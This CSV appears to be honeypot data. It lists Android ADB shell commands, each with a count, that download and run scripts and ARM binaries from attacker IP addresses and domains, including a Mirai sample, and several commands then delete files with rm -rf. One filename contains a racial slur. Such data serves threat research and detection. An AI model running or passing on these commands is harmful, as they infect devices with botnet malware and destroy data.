input,count
cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,93
cd /data/local/tmp/; busybox wget http://45.125.66.56/oarm; chmod 777 oarm; ./oarm adb; busybox wget http://45.125.66.56/oarm7; chmod 777 oarm7; ./oarm7 adb,1
cd /data/local/tmp/; busybox wget http://45.131.111.198/nigger1.sh; sh w.sh; curl http://45.131.111.198/nigger2.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,2
cd /data/local/tmp/; busybox wget http://45.200.148.113/w.sh; sh w.sh; curl http://45.200.148.113/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://45.202.35.56/w.sh; sh w.sh; curl http://45.202.35.56/c.sh; sh c.sh; rm -rf w.sh; rm -rf c.sh,4
cd /data/local/tmp/; busybox wget http://45.202.35.56/w.sh; sh w.sh; curl http://45.202.35.56/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,5
cd /data/local/tmp/; busybox wget http://45.202.35.68/w.sh; sh w.sh; curl http://45.202.35.68/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,14
cd /data/local/tmp/; busybox wget http://45.39.70.13/w.sh; sh w.sh; curl http://45.39.70.13/c.sh; sh c.sh,5
cd /data/local/tmp/; busybox wget http://45.66.231.148/r; sh r adb; curl http://45.66.231.148/r; sh r adb,3
cd /data/local/tmp/; busybox wget http://45.88.88.43/w.sh; sh w.sh; curl http://45.88.88.43/c.sh; sh c.sh,43
cd /data/local/tmp/; busybox wget http://46.19.143.30/w.sh; sh w.sh; curl http://46.19.143.30/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://46.203.233.30/android/c.sh; sh c.sh; curl http://46.203.233.30/android/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://46.203.233.30/android/w.sh; sh w.sh; curl http://46.203.233.30/android/c.sh; sh c.sh,6
cd /data/local/tmp/; busybox wget http://5.175.237.74/w.sh; sh w.sh; curl http://5.175.237.74/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://51.120.244.179/w.sh; sh w.sh; curl http://51.120.244.179/c.sh; sh c.sh,14
cd /data/local/tmp/; busybox wget http://77.221.153.161/w.sh; sh w.sh; curl http://77.221.153.161/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://77.221.157.206/zhoung/w.sh; sh w.sh; curl http://77.221.157.206/zhoung/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://81.161.238.213/w.sh; sh w.sh; curl http://81.161.238.213/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://87.121.84.219/w.sh; sh w.sh; curl http://87.121.84.219/c.sh; sh c.sh,6
cd /data/local/tmp/; busybox wget http://87.121.84.37/w.sh; sh w.sh; curl http://87.121.84.37/c.sh; sh c.sh,41
cd /data/local/tmp/; busybox wget http://87.121.84.39w.sh; sh w.sh; curl http://87.121.84.39/c.sh; sh c.sh,3
cd /data/local/tmp/; busybox wget http://89.169.4.44/w.sh; sh w.sh; curl http://89.169.4.44/c.sh; sh c.sh,13
cd /data/local/tmp/; busybox wget http://93.123.109.208/w.sh; sh w.sh; curl http://93.123.109.208/c.sh; sh c.sh,12
cd /data/local/tmp/; busybox wget http://94.142.130.241/w.sh; sh w.sh; curl http://94.142.130.241/c.sh; sh c.sh,203
cd /data/local/tmp/; busybox wget http://94.156.177.119/w.sh; sh w.sh android.exploit; curl http://94.156.177.119/c.sh; sh c.sh android.exploit,1
cd /data/local/tmp/; busybox wget http://94.156.189.224/w.sh; sh w.sh; curl http://94.156.189.224/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://server.eye-network.ru/w.sh; sh w.sh; curl http://server.eye-network.ru/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://server1.eye-network.ru/w.sh; sh w.sh; curl http://server1.eye-network.ru/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://server2.eye-network.ru/w.sh; sh w.sh; curl http://server2.eye-network.ru/c.sh; sh c.sh,1
cd /data/local/tmp/; curl http://103.77.172.24/curl.sh; sh curl.sh; busybox wget http://103.77.172.24/busybox.sh; sh busybox.sh; wget http://103.77.172.24/wget.sh; sh wget.sh; rm -rf *,7
cd /data/local/tmp/; curl http://137.184.54.184/curl.sh; sh curl.sh; busybox wget http://137.184.54.184/busybox.sh; sh busybox.sh; wget http://137.184.54.184/wget.sh; sh wget.sh; rm -rf *,1
cd /data/local/tmp/; curl http://15.235.143.186/bbccbbc.sh; sh bbccbbc.sh; busybox wget http://15.235.143.186/bbccbbbw.sh; sh bbccbbbw.sh; wget http://15.235.143.186/bbccbbw.sh; sh bbccbbw.sh; rm -rf *,9
cd /data/local/tmp/; curl http://15.235.203.214/bolosicancu.sh; sh bolosicancu.sh; busybox wget http://15.235.203.214/bolosicanbu.sh; sh bolosicanbu.sh; wget http://15.235.203.214/bolosicanwe.sh; sh bolosicanwe.sh; rm -rf *,6
cd /data/local/tmp/; curl http://36.50.135.139/huyhoangc.sh; sh huyhoangc.sh; busybox wget http://36.50.135.139/huyhoangbw.sh; sh huyhoangbw.sh; wget http://36.50.135.139/huyhoangw.sh; sh huyhoangw.sh; rm -rf *,2
cd /data/local/tmp/; pkill -f sh; pkill -f arm; pkill -f arm5; pkill -f arm6; pkill -f arm7; pkill -f mips; pkill -f ppc; pkill -f spc; pkill -f x86; pkill -f x86_64;,8
cd /data/local/tmp/; rm * -rf; killall /bin/busybox ; rm * ; wget http://185.93.89.101/arm7; curl http://185.93.89.101/arm7 -O- ; chmod 777 arm7; ./arm7 adblocker; rm * -rf,2
cd /data/local/tmp/; rm * -rf; killall /bin/busybox ; rm * ; wget http://185.93.89.106/arm7; curl http://185.93.89.106/arm7 -O- ; chmod 777 arm7; ./arm7 adblocker; rm * -rf,2
cd /data/local/tmp/; rm *; busybox wget http://146.19.24.68/arm7; chmod 777 arm7; ./arm7 ADB,17
cd /data/local/tmp/; rm *; busybox wget http://150.241.103.211/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://178.215.238.13/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://178.215.238.8/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://185.132.53.13/mirai.arm7; chmod 777 mirai.arm7; ./mirai.arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://185.142.53.43/arm7; chmod 777 arm7; ./arm7 ADB,2
cd /data/local/tmp/; rm *; busybox wget http://185.93.89.101/larm7; curl http://185.93.89.101/larm7 -O- ; chmod 777 larm7; ./larm7 adblocker;rm * -rf,1
cd /data/local/tmp/; rm *; busybox wget http://192.142.102.239/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://194.165.16.26/arm7; chmod 777 arm7; ./arm7 BRUHH,4
cd /data/local/tmp/; rm *; busybox wget http://212.64.215.71/arm7; chmod 777 arm7; ./arm7 ADB,2
cd /data/local/tmp/; rm *; busybox wget http://45.202.35.24/binns/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://45.202.35.24/oth/arm7; chmod 777 arm7; ./arm7 BRUHH,3
cd /data/local/tmp/; rm *; busybox wget http://45.202.35.36/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://45.202.35.88/arm7; chmod 777 arm7; ./arm7 BRUHH,2
cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker,1
cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; curl http://83.222.191.91/Kloki.arm7 -O-; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker; wget http://83.222.191.91/a; chmod 777 a; ./a adblocker; rm * -rf,4
cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; curl http://83.222.191.91/Kloki.arm7 -O-; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker; wget http://83.222.191.91/a; chmod 777 a; ./a adblocker; rm* -rf,7
cd /data/local/tmp/; rm *; busybox wget http://87.120.116.226/arm7; chmod 777 arm7; ./arm7 BRUHH,16
cd /data/local/tmp/; rm *; busybox wget http://92.249.48.87/arm7; chmod 777 arm7; ./arm7 BRUHH,2
cd /data/local/tmp/; rm *; busybox wget http://93.123.85.180/arm7; chmod 777 arm7; ./arm7 BRUHH,1
cd /data/local/tmp/; rm *; busybox wget http://95.214.27.183/arm7; chmod 777 arm7; ./arm7 BRUHH,2
